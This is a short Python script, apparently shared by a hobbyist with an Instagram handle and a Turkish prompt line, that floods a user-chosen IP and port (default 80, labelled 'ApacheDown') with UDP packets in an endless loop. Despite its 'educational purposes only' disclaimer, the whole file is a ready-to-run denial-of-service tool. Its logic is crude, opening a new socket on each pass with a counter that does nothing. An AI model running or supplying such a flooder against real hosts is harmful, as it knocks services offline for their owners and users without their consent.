import socket
   
print("Warning!!!! This Script is no joke and it is for educational purposes only, I'm not responsible for any damage caused by this script")
print("İnstagram:aqehti")

print("Default Port Ayarlamak İstiyorsanız 0 Tuşuna basınız")
ip = input('IP >> ')
port = int(input('Port (Default: 80 ApacheDown) >> '))

if port == 0:
      port = 80

while True:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect((ip, port))
   i = 0
   if i < 10:
      s.send(b'\x01')

